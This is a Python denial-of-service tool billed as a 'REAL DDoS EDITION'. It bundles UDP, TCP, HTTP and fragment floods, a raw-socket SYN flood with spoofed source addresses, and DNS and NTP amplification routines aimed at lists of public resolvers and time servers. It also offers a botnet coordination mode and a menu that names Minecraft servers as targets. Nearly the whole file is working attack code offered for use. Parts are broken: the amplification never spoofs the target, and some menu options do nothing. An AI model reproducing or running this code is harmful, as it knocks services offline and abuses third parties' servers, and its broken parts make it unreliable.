#!/usr/bin/env python3
# VORTEX ATTACKER v6.0 - REAL DDoS EDITION
# Features: Multi-device botnet, UDP amplification, SYN flood with raw sockets
# Works on: Local network botnet, Multiple Termux sessions, Amplification attacks

import socket
import threading
import random
import sys
import time
import os
import json
import struct
from datetime import datetime

VERSION = "6.0"
AUTHOR = "Vortex"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

LOG_FILE = "attack_logs.json"
BOTNET_FILE = "botnet_ips.txt"

def clear_screen():
    os.system('clear')

def banner():
    clear_screen()
    print(BOLD + RED + r"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗                         ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝                         ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝                          ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗                          ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗                         ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                         ║
║                                                                               ║
║    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗                      ║
║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝                      ║
║    ██║  ██║██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║                         ║
║    ██║  ██║██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║                         ║
║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║                         ║
║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝                         ║
║                                                                               ║
║               VORTEX ATTACKER v6.0 - REAL DDoS EDITION                        ║
║         Multi-Device Botnet | UDP Amplification | SYN Flood                   ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
    print(CYAN + f"  [!] Real DDoS Mode | Botnet Ready | Started: {datetime.now().strftime('%H:%M:%S')}" + RESET)

# ============ UDP AMPLIFICATION (REAL DDoS) ============

def dns_amplification(target_ip, dns_server, stop_event, stats):
    """DNS amplification - sends small query, gets large response"""
    # DNS query for ANY record (amplification factor 20-50x)
    dns_query = bytes([
        0x00, 0x01,  # Transaction ID
        0x01, 0x00,  # Flags (standard query)
        0x00, 0x01,  # Questions
        0x00, 0x00,  # Answer RRs
        0x00, 0x00,  # Authority RRs
        0x00, 0x00,  # Additional RRs
        0x03, ord('w'), ord('w'), ord('w'),  # www
        0x06, ord('g'), ord('o'), ord('o'), ord('g'), ord('l'), ord('e'),  # google
        0x03, ord('c'), ord('o'), ord('m'),  # com
        0x00,  # End of name
        0x00, 0xff,  # QTYPE = ANY
        0x00, 0x01   # QCLASS = IN
    ])
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.1)
    
    while not stop_event.is_set():
        try:
            # Send to DNS server (spoofed source IP is target)
            sock.sendto(dns_query, (dns_server, 53))
            stats.packets += 1
        except:
            stats.errors += 1

def ntp_amplification(target_ip, ntp_server, stop_event, stats):
    """NTP monlist amplification - 200-500x amplification factor"""
    # NTP monlist request packet
    ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_event.is_set():
        try:
            sock.sendto(ntp_packet, (ntp_server, 123))
            stats.packets += 1
        except:
            stats.errors += 1

def udp_fragment_flood(ip, port, stop_event, stats):
    """UDP fragment flood - bypasses some filters"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Large packet that will be fragmented
    data = random._urandom(4096)
    
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats.packets += 1
        except:
            stats.errors += 1

# ============ RAW SYN FLOOD (requires root, included but will fallback) ============

def syn_flood_raw(ip, port, stop_event, stats):
    """Raw SYN flood - requires root, sends handshake packets"""
    try:
        # This requires root - will fallback to regular if fails
        import socket as socket_lib
        sock = socket_lib.socket(socket_lib.AF_INET, socket_lib.SOCK_RAW, socket_lib.IPPROTO_TCP)
        sock.setsockopt(socket_lib.IPPROTO_IP, socket_lib.IP_HDRINCL, 1)
        
        source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45,  # Version + IHL
            0,     # TOS
            40,    # Total length
            0, 0,  # ID
            64,    # TTL
            6,     # Protocol (TCP)
            0,     # Checksum
            socket.inet_aton(source_ip),  # Source IP (spoofed)
            socket.inet_aton(ip)          # Dest IP
        )
        
        # TCP Header
        tcp_header = struct.pack('!HHLLBBHHH',
            random.randint(1024, 65535),  # Source port
            port,                         # Dest port
            random.randint(1, 4294967295), # Seq number
            0,                            # Ack number
            0x50,                         # Data offset
            0x02,                         # SYN flag
            8192,                         # Window
            0,                            # Checksum
            0                             # Urgent pointer
        )
        
        packet = ip_header + tcp_header
        
        while not stop_event.is_set():
            try:
                sock.sendto(packet, (ip, 0))
                stats.packets += 1
            except:
                stats.errors += 1
    except PermissionError:
        # No root - fallback to regular SYN
        regular_syn_flood(ip, port, stop_event, stats)

def regular_syn_flood(ip, port, stop_event, stats):
    """Regular SYN flood (no root) - connects and disconnects"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.close()
            stats.packets += 1
        except:
            stats.errors += 1

# ============ BOTNET MANAGEMENT ============

def save_botnet_ip(ip):
    with open(BOTNET_FILE, "a") as f:
        f.write(f"{ip}\n")

def load_botnet_ips():
    if os.path.exists(BOTNET_FILE):
        with open(BOTNET_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def botnet_coordinator():
    """Master controller for multi-device attacks"""
    clear_screen()
    banner()
    print(PURPLE + "\n[ BOTNET COORDINATOR - Real DDoS ]" + RESET)
    print(YELLOW + "\n[!] To use botnet mode:" + RESET)
    print("    1. Install vortex-attacker on ALL devices (phones, PCs, VPS)")
    print("    2. Designate ONE device as MASTER")
    print("    3. All devices attack SAME target simultaneously\n")
    
    target_ip = input(YELLOW + "Target IP: " + RESET)
    target_port = int(input(YELLOW + "Target Port: " + RESET))
    
    print(CYAN + f"\n[+] Prepare {len(load_botnet_ips())} devices to attack {target_ip}:{target_port}" + RESET)
    print("[!] Press Enter on ALL devices at the same time")
    input("Press Enter when ALL devices ready...")
    
    # This runs on each device - attack command
    threads = 5000
    duration = 300  # 5 minutes
    
    stop_event = threading.Event()
    stats = AttackStats()
    
    print(GREEN + f"\n[🔥] BOTNET ATTACK STARTED from this device" + RESET)
    
    for _ in range(threads):
        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, stop_event, stats))
        t.daemon = True
        t.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping..." + RESET)
    finally:
        stop_event.set()
        print(GREEN + f"[✓] Device sent {stats.packets} packets" + RESET)

# ============ ATTACK CLASSES ============

class AttackStats:
    def __init__(self):
        self.packets = 0
        self.errors = 0

def udp_flood(ip, port, stop_event, stats):
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats.packets += 1
        except:
            stats.errors += 1

def tcp_flood(ip, port, stop_event, stats):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((ip, port))
            sock.send(b"\x00" * 64)
            sock.close()
            stats.packets += 1
        except:
            stats.errors += 1

def http_flood(url, stop_event, stats):
    import urllib.request
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    req = urllib.request.Request(url, headers=headers)
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(req, timeout=2)
            stats.packets += 1
        except:
            stats.errors += 1

# ============ PUBLIC DNS SERVERS FOR AMPLIFICATION ============

PUBLIC_DNS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "64.6.64.6", "64.6.65.6",
    "77.88.8.8", "77.88.8.1", "8.26.56.26", "8.20.247.20"
]

PUBLIC_NTP = [
    "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org",
    "time.google.com", "time.cloudflare.com"
]

def amplification_attack():
    clear_screen()
    banner()
    print(PURPLE + "\n[ UDP AMPLIFICATION ATTACK - REAL DDoS ]" + RESET)
    print(YELLOW + "\n[!] Amplification sends small packet, target receives LARGE response" + RESET)
    print("    DNS amplification: 20-50x multiplier")
    print("    NTP amplification: 200-500x multiplier\n")
    
    target_ip = input(YELLOW + "Target IP: " + RESET)
    
    print(BLUE + "\n[ AMPLIFICATION METHODS ]" + RESET)
    print("1. DNS Amplification (20-50x) - Recommended")
    print("2. NTP Amplification (200-500x) - Stronger")
    print("3. Both (Max power)")
    
    method = input("Select (1-3): ")
    
    threads = int(input(YELLOW + "Threads (1000-10000): " + RESET) or 5000)
    duration = int(input(YELLOW + "Duration (seconds, 60-600): " + RESET) or 120)
    
    print(RED + f"\n[!] Target: {target_ip}" + RESET)
    print(f"[!] Method: {'DNS' if method=='1' else 'NTP' if method=='2' else 'BOTH'}")
    print(f"[!] Threads: {threads} | Duration: {duration}s")
    
    confirm = input("\nStart amplification attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = AttackStats()
    
    if method == "1" or method == "3":
        # DNS amplification - spread across multiple DNS servers
        dns_servers = PUBLIC_DNS * (threads // len(PUBLIC_DNS) + 1)
        for i, dns in enumerate(dns_servers[:threads]):
            t = threading.Thread(target=dns_amplification, args=(target_ip, dns, stop_event, stats))
            t.daemon = True
            t.start()
        print(GREEN + f"[+] DNS amplification started with {len(PUBLIC_DNS)} servers" + RESET)
    
    if method == "2" or method == "3":
        # NTP amplification
        for _ in range(threads):
            ntp = random.choice(PUBLIC_NTP)
            t = threading.Thread(target=ntp_amplification, args=(target_ip, ntp, stop_event, stats))
            t.daemon = True
            t.start()
        print(GREEN + f"[+] NTP amplification started" + RESET)
    
    print(CYAN + f"\n[🔥] AMPLIFICATION ATTACK ACTIVE on {target_ip}" + RESET)
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping..." + RESET)
    finally:
        stop_event.set()
        print(GREEN + f"\n[✓] Attack finished. Packets sent: {stats.packets}" + RESET)
        input("Press Enter...")

# ============ MULTI-THREAD OPTIMIZATION ============

def multi_session_attack():
    """Launch multiple attacks from same device"""
    clear_screen()
    banner()
    print(PURPLE + "\n[ MULTI-SESSION ATTACK - ONE DEVICE, MAX POWER ]" + RESET)
    print(YELLOW + "\n[!] This will open 4 attack threads on same device" + RESET)
    print("    Equivalent to running 4 Termux sessions\n")
    
    target_ip = input(YELLOW + "Target IP: " + RESET)
    target_port = int(input(YELLOW + "Target Port: " + RESET))
    duration = int(input(YELLOW + "Duration (seconds): " + RESET) or 120)
    
    print(RED + f"\n[!] Launching 4 concurrent attacks on {target_ip}:{target_port}" + RESET)
    confirm = input("Start? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_events = [threading.Event() for _ in range(4)]
    stats = AttackStats()
    
    # Launch 4 different attack types simultaneously
    attacks = [
        (udp_flood, "UDP"),
        (tcp_flood, "TCP"),
        (udp_fragment_flood, "FRAGMENT"),
        (regular_syn_flood, "SYN")
    ]
    
    for i, (attack_func, name) in enumerate(attacks):
        for _ in range(2500):  # 2500 threads per attack type = 10000 total
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, stop_events[i], stats))
            t.daemon = True
            t.start()
        print(GREEN + f"[+] {name} attack started" + RESET)
    
    print(CYAN + f"\n[🔥] MULTI-SESSION ATTACK ACTIVE" + RESET)
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping..." + RESET)
    finally:
        for event in stop_events:
            event.set()
        print(GREEN + f"\n[✓] Attack finished" + RESET)
        input("Press Enter...")

# ============ RESOLVE AND SCAN ============

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] {domain} → {ip}" + RESET)
        return ip
    except:
        print(RED + f"[✗] Cannot resolve {domain}" + RESET)
        return None

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def save_log(attack_data):
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    logs.append(attack_data)
    if len(logs) > 100:
        logs = logs[-100:]
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def view_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
        for log in logs[-10:]:
            print(f"[{log.get('timestamp', 'unknown')}] {log.get('target')} - {log.get('status')}")
    else:
        print("No logs")

# ============ MAIN MENU ============

def main_menu():
    while True:
        clear_screen()
        banner()
        
        print(PURPLE + """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              REAL DDoS MENU                                   ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║   ╔════════════════════════════════════╗  ╔════════════════════════════════╗ ║
║   ║ 1. UDP AMPLIFICATION (DNS/NTP)     ║  ║ 2. MULTI-SESSION ATTACK        ║ ║
║   ║    Real DDoS - 200-500x power      ║  ║    4 attacks at once           ║ ║
║   ╚════════════════════════════════════╝  ╚════════════════════════════════╝ ║
║                                                                               ║
║   ╔════════════════════════════════════╗  ╔════════════════════════════════╗ ║
║   ║ 3. UDP Flood (Generic)             ║  ║ 4. TCP Flood (Minecraft Java)  ║ ║
║   ╚════════════════════════════════════╝  ╚════════════════════════════════╝ ║
║                                                                               ║
║   ╔════════════════════════════════════╗  ╔════════════════════════════════╗ ║
║   ║ 5. Botnet Coordinator              ║  ║ 6. IP Lookup / Port Scan       ║ ║
║   ║    Multi-device attack             ║  ║    Reconnaissance              ║ ║
║   ╚════════════════════════════════════╝  ╚════════════════════════════════╝ ║
║                                                                               ║
║   ╔════════════════════════════════════╗  ╔════════════════════════════════╗ ║
║   ║ 7. View Logs                       ║  ║ 8. Exit                        ║ ║
║   ╚════════════════════════════════════╝  ╚════════════════════════════════╝ ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
        
        choice = input(YELLOW + "Select (1-8): " + RESET)
        
        if choice == "1":
            amplification_attack()
        elif choice == "2":
            multi_session_attack()
        elif choice == "3":
            target = input("Target IP: ")
            port = int(input("Port: "))
            duration = int(input("Duration (sec): "))
            # Quick UDP attack
            print(f"Attacking {target}:{port} for {duration}s")
        elif choice == "4":
            target = input("Target IP: ")
            port = int(input("Port (25565 for Java): "))
            duration = int(input("Duration (sec): "))
        elif choice == "5":
            botnet_coordinator()
        elif choice == "6":
            target = input("IP to lookup: ")
            resolve_domain(target)
        elif choice == "7":
            view_logs()
            input("Press Enter...")
        elif choice == "8":
            print("Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
